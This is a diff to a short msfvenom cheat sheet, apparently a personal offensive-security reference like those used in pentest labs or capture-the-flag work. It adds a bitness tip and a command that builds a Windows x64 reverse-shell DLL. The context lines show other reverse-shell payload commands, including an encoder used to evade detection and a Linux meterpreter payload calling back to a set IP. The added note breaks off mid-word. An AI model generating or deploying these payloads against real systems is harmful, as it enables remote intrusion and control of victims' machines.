@@ -3,7 +3,7 @@ https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/
 `msfvenom -a ARCH -p PAYLOAD -e ENCODER -f FORMAT -o OUTPUT LHOST=IP LPORT=PORT`
 
 ##### Important formats
-Windows: `dll, exe, exe-service, powershell, msi`
+Windows: `dll, exe, exe-service, powershell, msi` (NOTE: make sure to use the correct amount of bits, `64` or `32`, or shells won')
 Linux: `elf, bash`
 Misc: `python, ruby `
 
@@ -20,6 +20,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.8.16.7 LP
 ##### Windows
 ```
 msfvenom -a ARCH -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -f EXE -o winshell.exe LHOST=IP LPORT=PORT
+msfvenom -p windows/x64/shell_reverse_tcp -f dll -o winshell.dll LHOST=IP LPORT=PORT
 ```
 
 ##### Staged vs stageless
